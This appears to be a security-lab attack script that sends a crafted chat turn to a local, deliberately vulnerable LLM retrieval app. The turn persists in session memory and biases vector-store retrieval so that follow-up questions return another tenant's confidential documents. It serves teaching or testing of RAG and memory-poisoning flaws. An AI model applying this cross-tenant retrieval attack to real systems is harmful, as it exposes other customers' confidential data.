#!/usr/bin/env python3
"""Attack skill — cross-tenant retrieval through a crafted conversational turn.

AUTHORIZED SECURITY-LAB USE ONLY. Targets this skill's own vulnerable_app.py.

Sends ``assets/crafted_query.txt`` as one chat turn in a Meadow Fold session
(default ``meadow-analyst``). The turn names the other tenant, so its terms
outweigh the soft tenant-name boost in the shared vector store. Billy keeps
the turn in session memory and expands every follow-up question with it, so
ordinary follow-ups now rank Hilltop Creamery's confidential documents first.
No document is written and no other tenant's session is touched.

Exit code: 0 when the turn was sent, 1 when the target is unreachable.

Examples:
    python scripts/run_cross_tenant.py
    python scripts/run_cross_tenant.py --session meadow-analyst --payload assets/crafted_query.txt
"""

from __future__ import annotations

import argparse
import json
import os
import urllib.error
import urllib.request

SKILL_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DEFAULT_TARGET = os.getenv("LLM09_TARGET", "http://127.0.0.1:5209")
DEFAULT_PAYLOAD = os.path.join(SKILL_DIR, "assets", "crafted_query.txt")
DEFAULT_SESSION = "meadow-analyst"


def _post(url: str, body: dict) -> dict:
    req = urllib.request.Request(
        url, data=json.dumps(body).encode("utf-8"),
        headers={"Content-Type": "application/json"}, method="POST",
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        return json.loads(resp.read())


def check_target(base: str) -> bool:
    try:
        with urllib.request.urlopen(f"{base}/health", timeout=5) as resp:
            ok = json.loads(resp.read()).get("demo") == "llm09"
    except (urllib.error.URLError, OSError, ValueError):
        ok = False
    if not ok:
        print(f"[-] {base} is not the LLM09 target. Start it: python vulnerable_app.py")
    return ok


def main(argv=None) -> int:
    parser = argparse.ArgumentParser(description=__doc__,
                                     formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--target", default=DEFAULT_TARGET)
    parser.add_argument("--session", default=DEFAULT_SESSION, help="attacker's own session")
    parser.add_argument("--payload", default=DEFAULT_PAYLOAD, help="crafted turn to send")
    args = parser.parse_args(argv)

    if not check_target(args.target):
        return 1
    with open(args.payload, "r", encoding="utf-8") as fh:
        turn = fh.read().strip()

    print(f"[*] Sending {os.path.basename(args.payload)} as 1 turn in session "
          f"'{args.session}' (kept in conversational memory)")
    result = _post(f"{args.target}/query", {"session": args.session, "query": turn})
    top = result["retrieved"][0] if result["retrieved"] else None
    if top:
        where = "CROSS-TENANT" if result["cross_tenant"] else "own tenant"
        print(f"[+] Turn answered from '{top['id']}' ({where}, similarity {top['score']}).")
    print(f"[+] Session tenant: {result['tenant']}. 1 turn sent; no document written.")
    print("[*] Re-run scripts/evaluate_kpi.py to measure the effect on follow-up questions.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
